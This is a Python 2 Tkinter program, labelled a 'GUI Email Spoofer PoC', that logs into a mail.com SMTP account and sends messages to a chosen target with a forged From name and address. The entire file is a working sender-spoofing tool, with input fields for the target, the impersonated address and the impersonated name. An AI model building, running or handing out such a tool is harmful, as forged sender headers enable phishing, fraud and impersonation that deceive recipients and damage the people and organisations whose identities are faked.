import Tkinter as tk
import tkMessageBox
import smtplib
from Tkinter import *

class loginForm():

        def __init__(self,master):
                self.master = master
                self.frame = tk.Frame(master)
                Label(master, text="Make sure you have a mail.com\naccount! Log in here.\n\n").grid(sticky=W)
                self.lblEmail = Label(master , text = "Email:")
                self.lblEmail.grid(row=2, sticky=W)
                global email
                email = StringVar()
                self.emailEnt = Entry(master, textvariable=email, width=25).grid(row=3,columnspan=2,sticky=W)
                self.lblPassword = Label(master, text="Password:").grid(row=4, sticky=W)
                global password
                password = StringVar()
                self.passwordEnt = Entry(master, textvariable=password, width=25).grid(row=5,columnspan=2, sticky=W)
                self.btnLogin = Button(master , text = "Log in!" ,command = self.command )
                self.btnLogin.grid(row=6, sticky=SW)
                self.frame.grid()

        def command(self):
                try:
                    global email
                    global password
                    global emailLogin
                    emailLogin = email.get()
                    passwordLogin = password.get()
                except Exception as e:
                    print e

                try:
                    global server
                    server = smtplib.SMTP("smtp.mail.com",587)
                    server.login(emailLogin,passwordLogin)
                    tkMessageBox.showinfo("Login Successful", "You have successfully logged in as %s!" % emailLogin)
                    
                    self.newWindow = tk.Toplevel(self.master)
                    self.app = emailSettings(self.newWindow)
                except Exception as e:
                    print e
                    tkMessageBox.showerror("Error", "Your username or password is incorrect. Please try again.")

class emailSettings():

        def __init__(self , master):
                self.master = master
                self.frame = tk.Frame(master)
                self.master.title("Email Form")
                self.master.geometry("400x400")
                
                Label(self.frame, text="Target Email:").grid(row=0,sticky=W)
                global target
                target = StringVar()
                Entry(self.frame, textvariable=target, width=50).grid(row=1, columnspan=5, sticky=W)

                Label(self.frame, text="Spoofed Email:").grid(row=2, sticky=W)
                global spoofAs
                spoofAs = StringVar()
                Entry(self.frame, textvariable=spoofAs, width=50).grid(row=3, columnspan=5, sticky=W)

                Label(self.frame, text="Spoofed Name:").grid(row=4, sticky=W)
                global spoofAsName
                spoofAsName=StringVar()
                Entry(self.frame, textvariable=spoofAsName, width=50).grid(row=5, sticky=W)

                Label(self.frame, text="Email Subject:").grid(row=6, sticky=W)
                global subject
                subject = StringVar()
                Entry(self.frame, textvariable=subject, width=50).grid(row=7, columnspan=5, sticky=W)

                Label(self.frame, text="Message:").grid(row=8, sticky=W)
                global message
                message = Text(self.frame, height=3, width=50); message.grid(row=9, columnspan=5, sticky=W)
                
                self.sendButton = tk.Button(self.frame,text = 'Send Message',command = self.send_message)
                self.sendButton.grid(row=12, columnspan=5, sticky=W)
                self.frame.grid()


        def send_message(self):
                try:
                    global emailLogin
                    global target
                    global spoofAs
                    global spoofAsName
                    global subject
                    global message
                    global server
                    targetemail = target.get()
                    spoof = spoofAs.get()
                    spoofName = spoofAsName.get()
                    mailsubject = subject.get()
                    msg = message.get("1.0", 'end-1c')
                    finalmsg = """From: %s <%s>
To: %s
Subject: %s

%s
""" % (spoofName, spoof, targetemail, mailsubject, msg)
                    server.sendmail(emailLogin, targetemail, finalmsg)
                    tkMessageBox.showinfo("Message Sent!", "Message sent as %s sent successfully as %s!" % (spoof, targetemail))
                except Exception as e:
                    tkMessageBox.showerror("Mail Error", "Error Code: %s\nReason: %s" % (e, e))

root = Tk()

root.title("GUI Email Spoofer PoC")

root.geometry("200x200")

cls = loginForm(root)

root.mainloop()
